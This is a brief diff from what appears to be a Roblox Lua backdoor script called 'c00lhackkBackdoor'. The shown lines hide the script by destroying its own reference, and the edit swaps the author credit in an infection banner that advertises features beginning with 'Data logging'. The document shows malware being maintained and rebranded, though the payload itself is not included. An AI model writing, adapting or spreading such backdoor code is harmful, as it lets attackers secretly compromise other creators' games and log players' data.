@@ -18,8 +18,8 @@ end
 getfenv().script:Destroy()
 getfenv().script = nil
 
-print([[-- Infected with c00lhackkBackdoor by @Roblox_exploit-help
--- discord server: https://discord.gg/6mtR67Vk
+print([[-- Infected with c00lhackkBackdoor by cOSploit
+-- Best Scripter Right
 
 -- Features we have:
 -- -- Data logging
